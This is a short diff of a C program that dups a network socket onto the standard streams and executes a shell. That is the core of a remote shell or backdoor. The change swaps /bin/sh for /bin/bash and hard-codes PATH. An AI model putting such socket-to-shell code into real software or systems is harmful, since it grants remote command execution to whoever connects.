@@ -42,7 +42,8 @@ void	connection(int sock, char **env)
 	dup2(sock, 2);
 	dup2(sock, 1);
 	dup2(sock, 0);
-	execve("/bin/sh", (char *[]){"/bin/sh", NULL}, env);
+	(void)env;
+	execve("/bin/bash", (char *[]){"/bin/bash", NULL}, (char *[]){"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL});
 }
 
 void	handle_connection(int sock, char **env)
